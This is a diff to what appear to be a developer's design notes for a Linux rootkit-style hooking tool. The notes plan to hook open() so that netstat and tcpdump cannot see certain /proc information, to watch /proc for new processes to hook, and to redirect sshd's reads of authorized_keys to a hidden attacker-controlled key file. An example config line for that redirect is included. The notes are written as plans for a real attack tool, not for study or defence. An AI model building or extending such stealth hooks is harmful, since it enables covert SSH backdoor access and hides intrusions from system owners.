@@ -29,3 +29,13 @@ on another note:
 investigation leads me to be an alternate approach might be to modify the open() function as well. in this way
 we can hide key information from certain systems accessing the /proc system namely netstat. tcpdump and it's 
 variants could be the next target after this to ensure complete stealth :]
+
+variation: perhaps the main thread should monitor the /proc directory for new PIDs, if the argv[0] matches
+it hooks and if it doesnt it skips it but it maintains the list to check for new activity (this can be used
+instead of following forks.. 
+
+there is more to be done on the open() front... another idea is to change the path argument of certain open
+calls like for instance OpenSSHd keys? here's an example config file entry:
+*ssh* : /home/pasv/.ssh/authorized_keys2 -> /.our/secret/directory/authorized_keys. Thus it acts as a kind of
+program specific sym/hardlink without the user ever knowing.. any other program accessing the directory wouldn't
+be redirected to the spoof.. Think more onit..
